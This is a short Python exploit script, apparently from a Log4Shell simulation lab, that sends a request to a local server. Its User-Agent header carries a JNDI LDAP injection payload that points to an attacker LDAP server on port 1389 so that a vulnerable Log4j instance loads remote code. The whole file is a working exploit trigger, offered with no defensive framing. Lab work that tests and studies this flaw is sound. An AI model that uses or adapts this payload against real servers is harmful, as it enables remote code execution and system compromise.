import scenarios.log4shell.sim.build_servers as bs
import requests

# Target and payload
target_url = "http://localhost:8080"
headers = {
    "User-Agent": f"${{jndi:ldap://{bs.get_host_ip()}:1389/Exploit}}"
}

# Send the exploit request
try:
    response = requests.get(target_url, headers=headers, timeout=5)
    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Response: {response.text}")
except Exception as e:
    print(f"[!] Request failed: {e}")